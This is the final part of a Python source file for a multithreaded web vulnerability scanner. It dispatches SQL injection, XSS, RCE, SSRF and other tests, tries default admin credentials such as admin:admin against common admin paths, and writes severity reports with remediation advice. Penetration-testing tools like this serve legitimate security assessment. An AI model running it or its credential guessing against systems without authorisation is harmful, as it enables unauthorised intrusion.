                            reproduction=f"Access {test_url} without credentials",
                            payload="No authentication required"
                        )
                    
                    # 2. Information disclosure
                    if 'json' in response.headers.get('Content-Type', ''):
                        try:
                            data = response.json()
                            if isinstance(data, dict) and len(str(data)) > 1000:
                                self.add_vulnerability(
                                    url=test_url,
                                    type="API Information Disclosure",
                                    severity="Low",
                                    description="API returns excessive information",
                                    reproduction=f"GET {test_url}",
                                    payload="Excessive data exposure"
                                )
                        except:
                            pass
            except:
                continue
    
    def test_auth_bypass(self, url):
        """Authentication bypass testing"""
        print(f"{Fore.YELLOW}[*] Testing Authentication Bypass: {url}")
        
        # Common admin paths
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/cpanel',
            '/dashboard', '/controlpanel', '/manager', '/webadmin'
        ]
        
        for path in admin_paths:
            test_url = f"{self.target_url}{path}"
            try:
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    # Try common default credentials
                    credentials = [
                        ('admin', 'admin'),
                        ('admin', 'password'),
                        ('admin', '123456'),
                        ('administrator', 'administrator'),
                        ('root', 'root'),
                        ('test', 'test')
                    ]
                    
                    for username, password in credentials:
                        # Test basic auth bypass
                        auth_url = test_url.replace('http://', f'http://{username}:{password}@')
                        try:
                            auth_response = self.session.get(auth_url, timeout=10)
                            if auth_response.status_code == 200:
                                self.add_vulnerability(
                                    url=test_url,
                                    type="Default Credentials",
                                    severity="Critical",
                                    description=f"Default credentials work: {username}:{password}",
                                    reproduction=f"Use credentials {username}:{password}",
                                    payload=f"{username}:{password}"
                                )
                        except:
                            pass
            except:
                continue
    
    def add_vulnerability(self, url, type, severity, description, reproduction, payload=""):
        """Add vulnerability to findings"""
        vuln = {
            "url": url,
            "type": type,
            "severity": severity,
            "description": description,
            "reproduction": reproduction,
            "payload": payload if isinstance(payload, str) else str(payload)[:200],
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        self.vulnerabilities.append(vuln)
        
        # Color coding based on severity
        if severity == "Critical":
            color = Fore.RED
        elif severity == "High":
            color = Fore.MAGENTA
        elif severity == "Medium":
            color = Fore.YELLOW
        elif severity == "Low":
            color = Fore.BLUE
        else:
            color = Fore.CYAN
            
        print(f"{color}[!] {severity}: {type} at {url}")
        print(f"{color}    Description: {description}")
        if payload:
            print(f"{color}    Payload: {payload[:100]}...")
    
    def worker(self):
        """Worker thread for concurrent scanning"""
        while True:
            try:
                url, technique = self.fuzz_queue.get(timeout=5)
                
                if technique == 'sqli':
                    self.test_sql_injection_deep(url)
                elif technique == 'xss':
                    self.test_xss_deep(url)
                elif technique == 'rce':
                    self.test_rce_deep(url)
                elif technique == 'lfi':
                    self.test_lfi_rfi(url)
                elif technique == 'xxe':
                    self.test_xxe(url)
                elif technique == 'ssrf':
                    self.test_ssrf(url)
                elif technique == 'ssti':
                    self.test_ssti(url)
                elif technique == 'idor':
                    self.test_idor(url)
                elif technique == 'csrf':
                    self.test_csrf(url)
                elif technique == 'open_redirect':
                    self.test_open_redirect(url)
                elif technique == 'file_upload':
                    self.test_file_upload(url)
                elif technique == 'info_disclosure':
                    self.test_info_disclosure(url)
                elif technique == 'cors':
                    self.test_cors(url)
                elif technique == 'jwt':
                    self.test_jwt(url)
                elif technique == 'graphql':
                    self.test_graphql(url)
                elif technique == 'websocket':
                    self.test_websocket(url)
                elif technique == 'api':
                    self.test_api_endpoints(url)
                elif technique == 'auth_bypass':
                    self.test_auth_bypass(url)
                
                self.fuzz_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                print(f"{Fore.RED}[-] Worker error: {e}")
                continue
    
    def run_comprehensive_scan(self):
        """Run comprehensive vulnerability scan"""
        print(f"{Fore.GREEN}{'='*80}")
        print(f"{Fore.GREEN}{Style.BRIGHT}Advanced Web Vulnerability Scanner v2.0")
        print(f"{Fore.GREEN}{'='*80}")
        print(f"{Fore.CYAN}[*] Target: {self.target_url}")
        print(f"{Fore.CYAN}[*] Starting comprehensive scan...")
        
        # Phase 1: Reconnaissance
        print(f"\n{Fore.YELLOW}[*] Phase 1: Reconnaissance")
        self.perform_dns_recon()
        self.perform_port_scan()
        self.check_ssl_tls()
        
        # Phase 2: Crawling
        print(f"\n{Fore.YELLOW}[*] Phase 2: Website Crawling")
        self.crawl_website(self.target_url)
        self.fuzz_directories()
        
        # Add discovered URLs to queue
        all_urls = list(self.discovered_urls.union(self.discovered_endpoints))
        print(f"{Fore.GREEN}[+] Found {len(all_urls)} URLs to test")
        
        # Phase 3: Vulnerability Testing
        print(f"\n{Fore.YELLOW}[*] Phase 3: Vulnerability Testing")
        
        # Create worker threads
        threads = []
        for _ in range(self.max_threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Add URLs to queue with all techniques
        for url in all_urls:
            for technique in self.techniques:
                self.fuzz_queue.put((url, technique))
        
        # Wait for queue to empty
        self.fuzz_queue.join()
        
        # Stop workers
        for _ in range(self.max_threads):
            self.fuzz_queue.put((None, None))
        
        for t in threads:
            t.join()
        
        # Phase 4: Report Generation
        print(f"\n{Fore.YELLOW}[*] Phase 4: Report Generation")
        self.generate_report()
    
    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        print(f"\n{Fore.GREEN}{'='*80}")
        print(f"{Fore.GREEN}{Style.BRIGHT}Scan Results Summary")
        print(f"{Fore.GREEN}{'='*80}")
        
        if not self.vulnerabilities:
            print(f"{Fore.YELLOW}[*] No vulnerabilities found!")
            return
        
        # Group by severity
        critical = [v for v in self.vulnerabilities if v['severity'] == 'Critical']
        high = [v for v in self.vulnerabilities if v['severity'] == 'High']
        medium = [v for v in self.vulnerabilities if v['severity'] == 'Medium']
        low = [v for v in self.vulnerabilities if v['severity'] == 'Low']
        info = [v for v in self.vulnerabilities if v['severity'] == 'Info']
        
        print(f"\n{Fore.RED}[+] Critical Vulnerabilities ({len(critical)}):")
        for vuln in critical:
            print(f"{Fore.RED}  • {vuln['type']}")
            print(f"{Fore.RED}    URL: {vuln['url']}")
            print(f"{Fore.RED}    Description: {vuln['description']}")
            print(f"{Fore.RED}    Reproduction: {vuln['reproduction']}")
            if vuln['payload']:
                print(f"{Fore.RED}    Payload: {vuln['payload'][:100]}...")
            print()
        
        print(f"\n{Fore.MAGENTA}[+] High Vulnerabilities ({len(high)}):")
        for vuln in high:
            print(f"{Fore.MAGENTA}  • {vuln['type']}")
            print(f"{Fore.MAGENTA}    URL: {vuln['url']}")
            print(f"{Fore.MAGENTA}    Reproduction: {vuln['reproduction']}")
        
        print(f"\n{Fore.YELLOW}[+] Medium Vulnerabilities ({len(medium)}):")
        for vuln in medium:
            print(f"{Fore.YELLOW}  • {vuln['type']}")
            print(f"{Fore.YELLOW}    URL: {vuln['url']}")
        
        print(f"\n{Fore.BLUE}[+] Low Vulnerabilities ({len(low)}):")
        for vuln in low:
            print(f"{Fore.BLUE}  • {vuln['type']}")
            print(f"{Fore.BLUE}    URL: {vuln['url']}")
        
        print(f"\n{Fore.CYAN}[+] Informational Findings ({len(info)}):")
        for vuln in info:
            print(f"{Fore.CYAN}  • {vuln['type']}")
            print(f"{Fore.CYAN}    URL: {vuln['url']}")
        
        # Save detailed report
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"vulnerability_scan_{self.base_domain}_{timestamp}.json"
        
        report = {
            'scan_info': {
                'target': self.target_url,
                'scan_date': time.strftime("%Y-%m-%d %H:%M:%S"),
                'total_urls_tested': len(self.discovered_urls),
                'total_vulnerabilities': len(self.vulnerabilities),
                'scan_duration': 'N/A'  # Add timing if needed
            },
            'vulnerabilities': self.vulnerabilities,
            'urls_tested': list(self.discovered_urls),
            'parameters_found': dict(self.discovered_params)
        }
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"\n{Fore.GREEN}[+] Detailed report saved to: {filename}")
        print(f"{Fore.GREEN}[+] Total vulnerabilities found: {len(self.vulnerabilities)}")
        
        # Generate executive summary
        self.generate_executive_summary()
    
    def generate_executive_summary(self):
        """Generate executive summary"""
        print(f"\n{Fore.GREEN}{'='*80}")
        print(f"{Fore.GREEN}{Style.BRIGHT}Executive Summary")
        print(f"{Fore.GREEN}{'='*80}")
        
        critical_count = len([v for v in self.vulnerabilities if v['severity'] == 'Critical'])
        high_count = len([v for v in self.vulnerabilities if v['severity'] == 'High'])
        
        print(f"\n{Fore.CYAN}[*] Risk Assessment:")
        if critical_count > 0:
            print(f"{Fore.RED}    CRITICAL RISK: {critical_count} critical vulnerabilities found")
        if high_count > 0:
            print(f"{Fore.MAGENTA}    HIGH RISK: {high_count} high vulnerabilities found")
        
        print(f"\n{Fore.CYAN}[*] Recommendations:")
        print(f"{Fore.YELLOW}    1. Immediate Action Required:")
        print(f"{Fore.YELLOW}       - Fix all critical vulnerabilities within 24 hours")
        print(f"{Fore.YELLOW}       - Implement Web Application Firewall (WAF)")
        
        print(f"\n{Fore.YELLOW}    2. Short-term Actions (1 week):")
        print(f"{Fore.YELLOW}       - Fix high severity vulnerabilities")
        print(f"{Fore.YELLOW}       - Implement input validation and output encoding")
        print(f"{Fore.YELLOW}       - Review and fix authentication/authorization issues")
        
        print(f"\n{Fore.YELLOW}    3. Medium-term Actions (1 month):")
        print(f"{Fore.YELLOW}       - Fix medium severity vulnerabilities")
        print(f"{Fore.YELLOW}       - Implement security headers (CSP, HSTS, etc.)")
        print(f"{Fore.YELLOW}       - Conduct security awareness training")
        
        print(f"\n{Fore.YELLOW}    4. Long-term Actions:")
        print(f"{Fore.YELLOW}       - Implement secure SDLC")
        print(f"{Fore.YELLOW}       - Regular security assessments")
        print(f"{Fore.YELLOW}       - Continuous monitoring and logging")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Advanced Web Vulnerability Scanner')
    parser.add_argument('target', help='Target URL to scan')
    parser.add_argument('-d', '--depth', type=int, default=3, help='Crawl depth (default: 3)')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('-o', '--output', help='Output file name')
    parser.add_argument('--timeout', type=int, default=30, help='Request timeout in seconds (default: 30)')
    
    args = parser.parse_args()
    
    scanner = AdvancedWebScanner(
        target_url=args.target,
        depth=args.depth,
        threads=args.threads,
        timeout=args.timeout
    )
    
    try:
        scanner.run_comprehensive_scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
